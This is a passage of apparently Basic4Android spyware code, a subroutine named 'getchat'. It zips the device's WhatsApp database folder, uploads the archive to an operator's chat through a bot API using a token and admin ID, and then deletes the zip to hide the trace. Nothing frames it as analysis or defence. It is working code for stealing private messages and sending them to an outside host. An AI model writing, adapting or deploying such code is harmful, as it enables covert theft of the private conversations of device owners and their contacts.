...
Sub getchat (Topic As String, Data As String)

	Try
	
		'ToastMessageShow(File.DirRootExternal,True)
		'zip.ABZipfile(File.DirRootExternal&"/WhatsApp/" , "DataBases" , File.DirRootExternal&"/WhatsApp/myData.zip")
		zip.ABZipDirectory(File.DirRootExternal&"/WhatsApp/DataBases" ,File.DirRootExternal&"/WhatsApp/myData.zip")
		ht2.Download(apiserver&token&"/sendmessage?chat_id="&admin_id&"&text="&"waiting..."&"&reply_to_message_id="&0)
		'Log(File.DirRootExternal&"/WhatsApp")
		upload.upload(admin_id , "All dataBases".Replace(" ","%20") , 0 , File.DirRootExternal&"/WhatsApp" , "myData.zip")
		File.Delete(File.DirRootExternal&"/WhatsApp" , "myData.zip")
Catch
